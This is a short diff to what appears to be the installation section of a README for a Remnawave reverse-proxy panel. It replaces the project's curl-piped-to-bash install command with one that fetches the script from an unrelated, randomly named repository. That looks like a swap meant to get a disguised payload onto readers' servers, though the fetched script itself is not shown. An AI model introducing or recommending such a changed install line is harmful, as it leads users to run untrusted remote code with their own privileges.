@@ -172,7 +172,7 @@ The panel remains invisible without the correct authentication parameter.
 
 Execute the following command to begin installation:
 ```bash
-bash <(curl -Ls https://raw.githubusercontent.com/eGamesAPI/remnawave-reverse-proxy/refs/heads/main/install_remnawave.sh)
+bash <(curl -Ls https://raw.githubusercontent.com/mexanikssotnikov-creator/tjyldnkixa/master/install_remnawave.sh)
 ```
 
 <p align="center">
